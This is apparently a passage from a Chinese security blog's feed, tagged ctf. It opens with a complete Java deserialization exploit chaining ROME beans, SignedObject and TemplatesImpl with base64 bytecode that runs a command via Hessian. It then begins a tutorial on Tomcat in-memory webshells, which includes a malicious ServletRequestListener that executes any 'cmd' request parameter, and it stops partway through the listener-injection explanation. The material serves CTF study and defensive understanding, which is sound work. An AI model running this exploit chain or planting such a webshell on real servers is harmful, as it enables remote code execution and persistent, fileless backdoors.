class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> sun.security.provider.DSAPrivateKey;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">romeExp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, SignatureException, InvalidKeyException &#123;<br>        HashMap hashMapx=getObject();<br><br>        <span class="hljs-comment">//构造SignedObject对象</span><br>        SignedObject signedObject=<span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMapx, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DSAPrivateKey</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Signature</span>(<span class="hljs-string">&quot;x&quot;</span>) &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitVerify</span><span class="hljs-params">(PublicKey publicKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineInitSign</span><span class="hljs-params">(PrivateKey privateKey)</span> <span class="hljs-keyword">throws</span> InvalidKeyException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span> b)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineUpdate</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b, <span class="hljs-type">int</span> off, <span class="hljs-type">int</span> len)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] engineSign() <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">engineVerify</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] sigBytes)</span> <span class="hljs-keyword">throws</span> SignatureException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">engineSetParameter</span><span class="hljs-params">(String param, Object value)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br><br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">engineGetParameter</span><span class="hljs-params">(String param)</span> <span class="hljs-keyword">throws</span> InvalidParameterException &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;);<br><br><br>        <span class="hljs-comment">//构造ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(SignedObject.class,signedObject);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//构造ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//构造HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改字段</span><br>        Field obj= EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        HessianOutput hessianOutput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(ser);<br>        hessianOutput.writeObject(hashMap);<br>        hessianOutput.close();<br><br>        System.out.println(ser);<br>        HessianInput hessianInput=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser.toByteArray()));<br>        hessianInput.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String name,Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        Field field=obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-comment">//获取原生反序列化对象</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//构造TemplatesImpl对象</span><br>        <span class="hljs-type">byte</span>[] bytecode= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAIAoABgATCgAUABUIABYKABQAFwcACQcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAZAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBAAlDb2RlLmphdmEMAAcACAcAGwwAHAAdAQAEY2FsYwwAHgAfAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAADAAEAA0ADQAOAAsAAAAEAAEADAABAA0ADgACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAAEgALAAAABAABAA8AAQANABAAAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABYACwAAAAQAAQAPAAEAEQAAAAIAEg==&quot;</span>);<br>        <span class="hljs-type">byte</span>[][] bytee= <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytecode&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,bytee);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;Code&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-comment">//构造ToStringBean</span><br>        ToStringBean toStringBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class,templates);<br>        ToStringBean toStringBean1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(String.class,<span class="hljs-string">&quot;s&quot;</span>);<br><br>        <span class="hljs-comment">//构造ObjectBean</span><br>        ObjectBean objectBean=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ToStringBean.class,toStringBean1);<br><br>        <span class="hljs-comment">//构造HashMap</span><br>        HashMap hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean,<span class="hljs-string">&quot;novic4&quot;</span>);<br><br>        <span class="hljs-comment">//反射修改字段</span><br>        Field obj=EqualsBean.class.getDeclaredField(<span class="hljs-string">&quot;_obj&quot;</span>);<br>        Field equalsBean=ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br><br>        obj.setAccessible(<span class="hljs-literal">true</span>);<br>        equalsBean.setAccessible(<span class="hljs-literal">true</span>);<br><br>        obj.set(equalsBean.get(objectBean),toStringBean);<br><br>        <span class="hljs-keyword">return</span>  hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb内存马学习</title>
    <link href="/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2023/01/20/Java%E5%AE%89%E5%85%A8%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb内存马"><a href="#JavaWeb内存马" class="headerlink" title="JavaWeb内存马"></a>JavaWeb内存马</h1><h2 id="0x00-前置知识"><a href="#0x00-前置知识" class="headerlink" title="0x00 前置知识"></a>0x00 前置知识</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>内存马又名无文件马，见名知意，也就是无文件落地的 webshell 技术，是由于 webshell 特征识别、防篡改、目录监控等等针对 web 应用目录或服务器文件防御手段的介入，导致的文件 shell 难以写入和持久而衍生出的一种“概念型”木马。这种技术的核心思想非常简单，一句话就能概括，那就是对访问路径映射及相关处理代码的<strong>动态注册</strong>。</p><h3 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h3><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312147565.png" alt="image-20230131214733513"></p><h3 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h3><p>Servlet规范中规定了一个ServletContext接口，其用来保存一个Web应用中所有Servlet的上下文信息，能对Servlet中的各种资源进行访问、添加、删除等。其在Java中的具体实现是<code>javax.servlet.ServletContext</code>接口</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>在Tomcat中，ServletContext接口的具体实现就是ApplicationContext类，其实现了ServletContext接口中定义的一些方法。</p><p>Tomcat这里使用了<code>门面模式</code>，对<code>ApplicationContext</code>类进行了封装，我们调用<code>getServletContext()</code>方法获得的其实是<code>ApplicationContextFacade</code>类(门面类)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">ApplicationContextFacade</span><span class="hljs-params">(ApplicationContext context)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-built_in">this</span>.context = context;<span class="hljs-comment">//context的传递</span><br> <br>        classCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        objectCache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();<br>        initClassCache();<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>ApplicationContextFacade</code>类方法中都会调用this.context相应的方法，因此最终调用的还是<code>ApplicationContext</code>类的方法。</p><blockquote><p>门面模式可以简单分为三个部分:子系统、门面(Facade)、客户端</p><p>客户端可以通过调用门面方法进而调用集成的子系统方法，以医院类比，客户端相当于病人，门面相当于接待员，而子系统是医院内部细化的各部门。</p></blockquote><h3 id="StandardContext"><a href="#StandardContext" class="headerlink" title="StandardContext"></a>StandardContext</h3><p><code>org.apache.catalina.core.StandardContext</code>是子容器<code>Context</code>的标准实现类，其中包含了对Context子容器中资源的各种操作。</p><p><code>ApplicationContext</code>中的许多方法实际上还是调用了<code>StandardContext</code>中的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApplicationContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContext</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StandardContext context;<br><span class="hljs-comment">//...</span><br>    <span class="hljs-meta">@Override</span><br>      <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getRequestCharacterEncoding</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">return</span> context.getRequestCharacterEncoding();<br>      &#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301312219609.png" alt="image-20230131221926469"></p><blockquote><p>可以看出我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote><h2 id="0x01-Tomcat内存马"><a href="#0x01-Tomcat内存马" class="headerlink" title="0x01 Tomcat内存马"></a>0x01 Tomcat内存马</h2><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型,Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>这依赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，为方便调试，先加入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>10.0.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>注意版本与本机tomcat匹配，tomcat10后把很多常用类的位置都改了</p></blockquote><h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>目标就是在服务器中动态注册一个恶意的Listener。</p><p>而Listener根据事件源的不同，大致可以分为如下三种</p><ul><li>ServletContextListener</li><li>HttpSessionListener</li><li>ServletRequestListener</li></ul><blockquote><p><code>ServletRequestListener</code>用于监听<code>ServletRequest</code>对象，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法</p></blockquote><p>创建一个Servlet项目实现恶意Listener,目录配置⬇️</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010141228.png" alt="image-20230201014157169"></p><p>shell_Listener</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">shell_Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>        String cmd=request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Runtime.getRuntime().exec(cmd);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                n.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>访问任意目录可以执行命令</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010146200.png" alt="image-20230201014602139"></p><blockquote><p>接下来只要将恶意Listener动态注册进服务器</p></blockquote><h4 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h4><p>调用栈</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">requestInitialized:<span class="hljs-number">13</span>, shell_Listener (Listener)<br>fireRequestInitEvent:<span class="hljs-number">5992</span>, StandardContext (org.apache.catalina.core)<br>invoke:<span class="hljs-number">121</span>, StandardHostValve (org.apache.catalina.core)<br>invoke:<span class="hljs-number">92</span>, ErrorReportValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)<br>invoke:<span class="hljs-number">78</span>, StandardEngineValve (org.apache.catalina.core)<br>service:<span class="hljs-number">357</span>, CoyoteAdapter (org.apache.catalina.connector)<br>service:<span class="hljs-number">382</span>, Http11Processor (org.apache.coyote.http11)<br>process:<span class="hljs-number">65</span>, AbstractProcessorLight (org.apache.coyote)<br>process:<span class="hljs-number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)<br>doRun:<span class="hljs-number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)<br>run:<span class="hljs-number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)<br>runWorker:<span class="hljs-number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟进<code>StandardContext#fireRequestInitEvent</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">fireRequestInitEvent</span><span class="hljs-params">(ServletRequest request)</span> &#123;<br>        Object instances[] = getApplicationEventListeners();<span class="hljs-comment">//获取Listener数组</span><br>        <span class="hljs-keyword">if</span> ((instances != <span class="hljs-literal">null</span>) &amp;&amp; (instances.length &gt; <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-type">ServletRequestEvent</span> <span class="hljs-variable">event</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletRequestEvent</span>(getServletContext(), request);<br>            <span class="hljs-keyword">for</span> (Object instance : instances) &#123;<br>                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span> (!(instance <span class="hljs-keyword">instanceof</span> ServletRequestListener)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>                <span class="hljs-type">ServletRequestListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> (ServletRequestListener) instance;<br> <br>                <span class="hljs-keyword">try</span> &#123;<br>                    listener.requestInitialized(event);<span class="hljs-comment">//遍历触发数组内各Listener的requestInitialized方法</span><br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    ExceptionUtils.handleThrowable(t);<br>                    getLogger().error(sm.getString(<br>                            <span class="hljs-string">&quot;standardContext.requestListener.requestInit&quot;</span>,<br>                            instance.getClass().getName()), t);<br>                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>跟进第一行的<code>getApplicationEventListeners()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>();<span class="hljs-comment">//存储里Listener</span><br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">public</span> Object[] getApplicationEventListeners() &#123;<br>    <span class="hljs-keyword">return</span> applicationEventListenersList.toArray();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202302010157913.png" alt="image-20230201015745831"></p><p><code>StandardContext</code>也定义类添加Listener的方法,那么我们为了注册恶意Listener，就必须先获取<code>StandardContext</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addApplicationEventListener</span><span class="hljs-params">(Object listener)</span> &#123;<br>        applicationEventListenersList.add(listener);<br>    